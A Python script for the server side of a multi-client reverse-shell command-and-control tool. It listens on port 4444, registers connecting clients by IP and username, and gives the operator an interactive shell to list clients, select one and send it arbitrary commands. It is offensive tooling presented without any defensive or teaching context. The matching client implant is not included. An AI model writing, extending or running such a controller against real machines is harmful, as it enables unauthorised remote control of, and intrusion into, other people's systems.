import socket
import threading
import select

clients = []  # List to store connected clients
client_info = {}  # Dictionary to store client info (ip, username)

def handle_client(client_socket, client_address):
    try:
        client_ip = client_address[0]
        # Receive initial connection request
        connection_request = client_socket.recv(1024).decode()
        if connection_request == "Connection request":
            client_socket.send("Success".encode())
            print(f"Connection established from {client_ip}")
            
            # Ask for username from the client
            client_socket.send("Send username".encode())
            username = client_socket.recv(1024).decode()
            client_info[client_socket] = {"ip": client_ip, "username": username}

            # Loop to handle commands from the server to the client
            while True:
                command = input(f"Shell({client_ip})> ")  # You can modify to select different clients
                if command.lower() == "exit":
                    client_socket.send("exit".encode())
                    break

                # Send command to the client
                client_socket.send(command.encode())

                # Receive the result
                result = client_socket.recv(4096).decode()
                print(result)

    except Exception as e:
        print(f"Error with client {client_address}: {e}")
    finally:
        client_socket.close()
        clients.remove(client_socket)
        del client_info[client_socket]
        print(f"Client {client_address} disconnected")

def server():
    server_ip = "localhost"  # Bind to your IP address
    server_port = 4444  # Set a desired port

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_ip, server_port))
    server_socket.listen(5)
    print(f"[*] Listening on {server_ip}:{server_port}")

    while True:
        readable, _, _ = select.select([server_socket] + clients, [], [])
        for s in readable:
            if s == server_socket:
                # Accept new connection
                client_socket, client_address = server_socket.accept()
                clients.append(client_socket)
                print(f"New connection from {client_address[0]}:{client_address[1]}")

                # Start a thread to handle the client
                client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
                client_thread.start()

            else:
                # Handle data from connected clients
                try:
                    data = s.recv(1024).decode()
                    if not data:
                        raise Exception("Client disconnected")
                except Exception as e:
                    print(f"Client {client_info[s]['ip']} disconnected: {e}")
                    clients.remove(s)
                    del client_info[s]
                    s.close()

def list_clients():
    """ List all connected clients with their details """
    if clients:
        print("\nConnected clients:")
        for idx, client in enumerate(clients):
            info = client_info[client]
            print(f"[{idx}] IP: {info['ip']}, Username: {info['username']}")
    else:
        print("\nNo clients connected.")

def client_details(client_index):
    """ Show detailed info of a specific client """
    try:
        client = clients[client_index]
        info = client_info[client]
        print(f"\nDetails for client {client_index}:")
        print(f"IP Address: {info['ip']}")
        print(f"Username: {info['username']}")
    except IndexError:
        print(f"Invalid client index: {client_index}")

def server_shell():
    """ Command-line shell for managing the server """
    while True:
        command = input("ServerShell> ").lower()

        if command == "list":
            list_clients()
        elif command.startswith("details"):
            try:
                client_idx = int(command.split()[1])
                client_details(client_idx)
            except (IndexError, ValueError):
                print("Usage: details <client_index>")
        elif command.startswith("select"):
            try:
                client_idx = int(command.split()[1])
                selected_client = clients[client_idx]
                selected_info = client_info[selected_client]
                print(f"Interacting with {selected_info['ip']} - {selected_info['username']}")

                # Enter the shell for this client
                while True:
                    shell_command = input(f"Shell({selected_info['ip']})> ")
                    if shell_command.lower() == "exit":
                        break
                    selected_client.send(shell_command.encode())
                    result = selected_client.recv(4096).decode()
                    print(result)
            except (IndexError, ValueError):
                print("Invalid selection. Use: select <client_index>")
        elif command == "exit":
            print("Exiting server shell...")
            break
        else:
            print("Unknown command. Available commands: list, details <client_index>, select <client_index>, exit")

if __name__ == "__main__":
    # Start the server in a separate thread
    server_thread = threading.Thread(target=server)
    server_thread.start()

    # Start the server shell for interaction
    server_shell()
